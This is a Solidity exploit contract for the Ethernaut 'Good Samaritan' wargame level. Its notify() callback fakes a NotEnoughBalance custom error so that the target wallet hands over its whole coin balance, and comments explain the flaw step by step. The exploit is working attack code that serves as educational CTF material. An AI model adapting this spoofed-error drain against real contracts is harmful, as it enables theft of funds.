// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title GoodSamaritanAttack
 * @dev Exploit contract for Ethernaut Level 27 - Good Samaritan
 * 
 * VULNERABILITY EXPLANATION:
 * ========================
 * The Good Samaritan contract has a flaw in its error handling logic:
 * 
 * 1. requestDonation() tries to donate 10 coins via wallet.donate10()
 * 2. If donate10() reverts with NotEnoughBalance(), it catches the error
 * 3. Upon catching NotEnoughBalance(), it calls transferRemainder() to send ALL coins
 * 4. The Coin.transfer() function calls notify() on contract recipients
 * 
 * THE EXPLOIT:
 * ===========
 * We implement notify() to:
 * - Check if the amount is 10 (initial donation attempt)
 * - If yes, revert with NotEnoughBalance() error (fake it!)
 * - This tricks GoodSamaritan into thinking wallet is empty
 * - GoodSamaritan then calls transferRemainder() sending ALL coins
 * - On the second notify() call (with full amount), we let it succeed
 * 
 * SOLIDITY CUSTOM ERRORS:
 * ======================
 * Custom errors (introduced in Solidity 0.8.4) are more gas-efficient than strings
 * They are identified by their 4-byte selector (keccak256 hash of signature)
 * By reverting with the same error signature, we can manipulate error handling logic
 */

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
    function coin() external view returns (address);
    function wallet() external view returns (address);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract GoodSamaritanAttack {
    // Custom error matching the Wallet contract's error
    error NotEnoughBalance();
    
    IGoodSamaritan public goodSamaritan;
    
    constructor(address _goodSamaritan) {
        goodSamaritan = IGoodSamaritan(_goodSamaritan);
    }
    
    /**
     * @dev This function is called by Coin.transfer() when we receive coins
     * @param amount The amount of coins being transferred
     * 
     * Strategy:
     * - If amount is 10, this is the initial donate10() attempt
     * - We revert with NotEnoughBalance() to trick the error handling
     * - If amount is > 10, this is the transferRemainder() call
     * - We let it succeed to receive all the coins
     */
    function notify(uint256 amount) external pure {
        // If we're receiving the small donation (10 coins), fake the error
        if (amount == 10) {
            revert NotEnoughBalance();
        }
        // Otherwise, let the transfer succeed (we're receiving all coins!)
    }
    
    /**
     * @dev Execute the attack to drain all coins from Good Samaritan
     * 
     * Flow:
     * 1. Call requestDonation()
     * 2. GoodSamaritan calls wallet.donate10(this)
     * 3. Wallet transfers 10 coins to us
     * 4. Coin.transfer() calls our notify(10)
     * 5. We revert with NotEnoughBalance()
     * 6. GoodSamaritan catches this error
     * 7. GoodSamaritan calls wallet.transferRemainder(this)
     * 8. Wallet transfers ALL remaining coins to us
     * 9. Coin.transfer() calls our notify(1000000)
     * 10. We let it succeed - we now have all the coins!
     */
    function attack() external {
        goodSamaritan.requestDonation();
    }
    
    /**
     * @dev Get the balance of coins held by this contract
     */
    function getBalance() external view returns (uint256) {
        address coinAddress = goodSamaritan.coin();
        return ICoin(coinAddress).balances(address(this));
    }
    
    /**
     * @dev Get the balance of the Good Samaritan's wallet
     */
    function getWalletBalance() external view returns (uint256) {
        address coinAddress = goodSamaritan.coin();
        address walletAddress = goodSamaritan.wallet();
        return ICoin(coinAddress).balances(walletAddress);
    }
}
